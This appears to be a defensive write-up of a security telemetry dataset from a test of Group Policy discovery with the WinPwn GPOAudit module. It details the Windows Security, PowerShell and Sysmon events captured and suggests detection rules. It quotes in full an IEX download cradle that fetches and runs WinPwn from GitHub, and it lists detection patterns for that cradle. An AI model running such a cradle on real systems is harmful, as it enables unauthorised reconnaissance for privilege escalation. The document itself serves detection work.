# T1615-3: Group Policy Discovery — WinPwn GPOAudit

## Technique Context

T1615 (Group Policy Discovery) includes adversary use of offensive toolkits to systematically audit Group Policy Objects for security misconfigurations. WinPwn is a PowerShell-based post-exploitation framework offering modular functions for Windows enumeration and exploitation. The `GPOAudit` function enumerates GPOs to identify misconfigurations that could enable privilege escalation or lateral movement — for example, GPO-distributed scripts with writable paths, overly permissive software deployment policies, or weak password policies. The module is loaded via an IEX download cradle fetching WinPwn directly from raw.githubusercontent.com.

## What This Dataset Contains

The dataset covers three channels: 126 PowerShell events, 15 Security events, and 1 Sysmon event.

**Sysmon (1 event)**:
- **EID 22** (DNS query) — Resolution of `raw.githubusercontent.com`, confirming the download cradle reached the DNS layer. The query result is an IPv6-mapped address (`::ffff:185.x.x.x`), consistent with GitHub's raw content CDN. The source process is listed as `<unknown process>` due to the timing of the DNS event relative to process tracking.

**Security log (15 events)**:
- **EID 4688** (4 events) — Process creation. The key event captures `powershell.exe` launched with the full WinPwn download cradle: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPOAudit -noninteractive -consoleoutput}`. A second `powershell.exe` with an empty body (`& {}`) represents the cleanup/teardown pass. Two `whoami.exe` events bracket the test (pre- and post-identity checks).
- **EID 4689** (10 events) — Process exits for `powershell.exe`, `conhost.exe` (the console host associated with each PowerShell instance), and `whoami.exe`. Multiple `conhost.exe` exits indicate multiple PowerShell console sessions were created and torn down.
- **EID 4703** (1 event) — Token right adjustment for `powershell.exe`.

**PowerShell log (126 events)** — 121 EID 4104 script block events, 4 EID 4103 module pipeline events, and 1 EID 4100 error event. The 20-event sample set contains only PowerShell runtime infrastructure fragments and `Set-ExecutionPolicy Bypass`. The WinPwn download cradle is captured in the Security 4688 command line. The absence of WinPwn module script blocks in the sample set suggests either the download failed or the module body was not executed — the EID 4100 error event is consistent with an execution failure.

## What This Dataset Does Not Contain

The WinPwn `GPOAudit` function output — enumerated GPO misconfigurations — is not present. If the download succeeded and the function executed, it would generate extensive additional EID 4104 script block events containing the module code; their absence supports the interpretation that execution was blocked or the download failed.

No Sysmon EID 3 network connection event appears for the PowerShell outbound connection to raw.githubusercontent.com. The DNS query (EID 22) confirms the name was resolved, but no TCP connection was logged — possibly because the connection attempt fell outside the Sysmon filter window, or because connection filtering blocked the TCP handshake after DNS resolution.

LDAP traffic to the domain controller is absent, consistent with the GPO enumeration function not having executed.

Sysmon EID 1 (ProcessCreate) does not appear for `powershell.exe` in this dataset. The defended variant captured 48 Sysmon events including EID 1 for the inner `powershell.exe` process (the one with the WinPwn command line), suggesting Sysmon was active but the specific `powershell.exe` invocation in this undefended run did not match the include rule, or fell outside a brief capture window.

## Assessment

Compared to the defended variant (48 Sysmon, 10 Security, 51 PowerShell), the undefended run shows a dramatically reduced Sysmon footprint (1 vs. 48 events) despite similar Security and PowerShell counts (15 vs. 10 Security, 126 vs. 51 PowerShell). This divergence is notable: the defended variant captured EID 1, 7, 10, 11, and 17 Sysmon events including the WinPwn PowerShell command line via EID 1. The undefended dataset's single DNS query suggests a timing difference in collection rather than a fundamental difference in what Sysmon would log — the technique is the same, but the per-test collection window may have captured different slices of the execution.

The Security log EID 4688 is the most reliable and actionable artifact in both variants. You will find the full WinPwn URL including the pinned commit hash (`121dcee26a7aca368821563cbe92b2b5638c5773`) in the command line field, along with the `GPOAudit -noninteractive -consoleoutput` function invocation.

## Detection Opportunities Present in This Data

- **EID 4688: Command line containing `WinPwn.ps1` and `GPOAudit`** — The WinPwn script URL and function name are explicit in the 4688 command line. Alert on `powershell.exe` command lines containing `WinPwn` (case-insensitive) or the specific GitHub repository path `S3cur3Th1sSh1t/WinPwn`.

- **EID 4688: `iex` + `downloadstring` + `raw.githubusercontent.com`** — The download cradle pattern is a well-known indicator. Alert on `powershell.exe` command lines combining `iex`, `downloadstring` (or `DownloadString`), and `raw.githubusercontent.com`. This pattern catches multiple WinPwn functions and other IEX-loaded tools.

- **Sysmon EID 22: DNS query for `raw.githubusercontent.com` from `powershell.exe`** — Outbound DNS queries for `raw.githubusercontent.com` originating from `powershell.exe` are anomalous in most enterprise environments. This provides network-layer detection coverage independent of command-line logging.

- **EID 4688: `-noninteractive -consoleoutput` flags on a `powershell.exe` child process** — WinPwn's function arguments (`-noninteractive -consoleoutput`) in a `powershell.exe` command line are specific to WinPwn's invocation style. Alert on these flags appearing together in child PowerShell processes.

- **EID 4100: PowerShell error event correlated with IEX download** — The EID 4100 error event generated when the download or execution fails provides a secondary signal. Correlating EID 4100 with a prior EID 4688 containing an IEX download cradle — within the same process ID — narrows the investigation to cases where the download attempt was made but execution failed, which is itself operationally interesting.
